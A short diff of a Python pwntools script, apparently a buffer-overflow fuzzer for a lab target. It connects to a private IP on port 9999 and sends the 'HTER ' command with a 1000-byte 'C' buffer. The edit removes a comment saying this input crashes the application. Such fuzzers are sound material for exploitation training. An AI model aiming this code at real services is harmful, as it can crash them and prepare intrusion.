@@ -5,9 +5,10 @@ from pwn import *
 host = '192.168.145.129'  # Target IP
 port = 9999  # Target Port
 proto = 'tcp'
+
 s = remote(host, port)
 
-string = "HTER " # this causes the application crash
+string = "HTER "
 buffer = "C" * 1000
 increment = buffer
 
